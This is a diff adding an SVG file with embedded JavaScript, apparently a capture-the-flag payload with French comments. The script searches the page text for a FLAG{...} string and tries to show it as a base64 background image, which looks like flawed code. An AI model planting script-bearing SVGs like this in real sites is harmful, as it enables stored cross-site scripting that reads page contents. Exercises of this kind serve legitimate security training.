@@ -1,0 +1,22 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="https://www.svgrepo.com/show/535116/address-card.svg">
+  <script type="text/javascript">
+    <![CDATA[
+      // Tenter de récupérer le flag depuis le DOM
+      (function() {
+        // Chercher le flag dans le contenu de la page
+        var bodyText = document.body.innerText;
+        var flagMatch = bodyText.match(/FLAG\{.*?\}/i);
+        if (flagMatch) {
+          var flag = flagMatch[0];
+          // Afficher le flag en arrière-plan
+          var imgData = 'data:image/png;base64,' + btoa(flag);
+          document.getElementById('card').style.backgroundImage = 'url(' + imgData + ')';
+        } else {
+          // Si le flag n'est pas trouvé, afficher un message
+          alert('Flag non trouvé dans le DOM.');
+        }
+      })();
+    ]]>
+  </script>
+</svg>
